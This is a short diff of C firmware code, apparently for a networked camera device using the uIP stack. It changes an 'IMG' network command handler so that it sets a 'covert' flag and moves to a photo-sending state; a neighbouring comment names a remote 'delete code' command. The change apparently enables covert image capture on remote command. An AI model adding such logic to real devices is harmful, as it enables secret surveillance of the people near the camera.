@@ -117,7 +117,8 @@ void client() {
 
 		/* IMG/: TAKE IMAGE ON DEMAND */
 		if (uip_buf[UIP_LLH_LEN + UIP_TCPIP_HLEN] == 'I' && uip_buf[UIP_LLH_LEN + UIP_TCPIP_HLEN + 1] == 'M' && uip_buf[UIP_LLH_LEN + UIP_TCPIP_HLEN + 2] == 'G') {
-			//genericTakePhoto();
+			so.covert = 1;
+			update_state(SEND_PHOTO);
 		}
 
 		/* DEL/CODE: DELETE CODE */
